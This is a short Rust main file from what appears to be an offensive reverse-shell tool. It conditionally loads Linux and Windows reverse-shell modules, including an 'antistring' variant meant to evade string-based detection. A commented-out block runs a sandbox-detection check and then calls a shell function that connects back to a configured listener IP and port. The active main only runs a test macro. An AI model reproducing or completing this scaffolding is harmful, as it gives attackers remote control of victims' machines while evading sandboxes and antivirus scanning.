// Load Linux implementation if the target OS is Linux
#[cfg(target_os = "linux")]
mod rco_reverse_shell_linux;
#[cfg(target_os = "linux")]
use rco_reverse_shell_linux::shell;

// Load Windows implementation if the target OS is Windows
#[cfg(windows)]
mod rco_reverse_shell_windows;
#[cfg(all(windows, not(feature = "antistring")))]
use rco_reverse_shell_windows::shell;
#[cfg(all(windows, feature = "antistring"))]
use rco_reverse_shell_windows::antistring_shell as shell;

fn main() {
    let a = rco_utils::test!(17 as *const (); [u32]; [14, 15]);
    println!("{a:?}");
    /*// Runs the sandbox detection function or the dummy replacement, dependent on features
    if rco_utils::pound_sand() {
        return
    }

    shell(rco_config::LISTENER_IP, rco_config::LISTENER_PORT);*/
}
